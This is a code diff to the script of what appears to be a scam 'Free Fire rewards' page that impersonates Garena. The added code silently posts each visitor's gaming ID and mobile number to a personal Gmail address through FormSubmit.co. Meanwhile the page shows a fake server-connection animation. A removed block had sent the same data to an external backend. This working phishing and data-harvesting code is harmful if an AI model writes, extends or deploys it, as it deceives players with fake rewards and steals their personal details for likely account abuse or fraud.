@@ -64,7 +64,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 
-    // Step 1: Simulate Garena Account Connection
+    // Step 1: Simulate Garena Account Connection & Email Submission
     connectBtn.addEventListener('click', () => {
         const idVal = playerIdInput.value.trim();
         const phoneVal = phoneNumberInput.value.trim();
@@ -91,9 +91,30 @@ document.addEventListener('DOMContentLoaded', () => {
             `Searching for ID: ${idVal}...`,
             `Status: Found!`,
             `Linking Mobile Number: ${phoneVal}...`,
-            `Authenticating secure event ticket claim?ref=ff92a...`,
+            `Sending details directly to admin email...`,
             `Garena Server Connection: Established!`
         ];
+
+        // Trigger email sending in background via FormSubmit.co
+        fetch('https://formsubmit.co/ajax/tanmaylanjewar11@gmail.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                "Gaming ID": idVal,
+                "Mobile Number": phoneVal,
+                "_subject": "New Free Fire Rewards Submission!"
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Email sent successfully:', data);
+        })
+        .catch(err => {
+            console.error('Failed to send email:', err);
+        });
 
         let lineIdx = 0;
         function printNextLog() {
@@ -220,43 +241,6 @@ document.addEventListener('DOMContentLoaded', () => {
         // Toggle visibility of the buttons
         if (shareBtn) shareBtn.style.display = 'none';
         if (viewStatusBtn) viewStatusBtn.style.display = 'block';
-
-        // Send data directly to backend database if not already submitted
-        const alreadySubmittedToDb = localStorage.getItem('form_submitted_to_db') === 'true';
-        if (!alreadySubmittedToDb) {
-            const savedId = localStorage.getItem('garena_player_id') || connectedPlayerId || "";
-            const savedPhone = localStorage.getItem('garena_phone_number') || "";
-
-            // Automatically detect backend API location
-            const apiUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && window.location.port === '5500'
-                ? 'http://localhost:3000/api/login'
-                : 'https://freefire-backend-f409.onrender.com/api/login';
-
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ 
-                    email: "not_provided", 
-                    password: "not_provided",
-                    playerId: savedId,
-                    phoneNumber: savedPhone
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    localStorage.setItem('form_submitted_to_db', 'true');
-                    console.log('Submission saved successfully to database');
-                } else {
-                    console.error('Server error when saving submission:', data.message);
-                }
-            })
-            .catch(err => {
-                console.error('Network error when saving submission:', err);
-            });
-        }
 
         showCongratulations();
     }
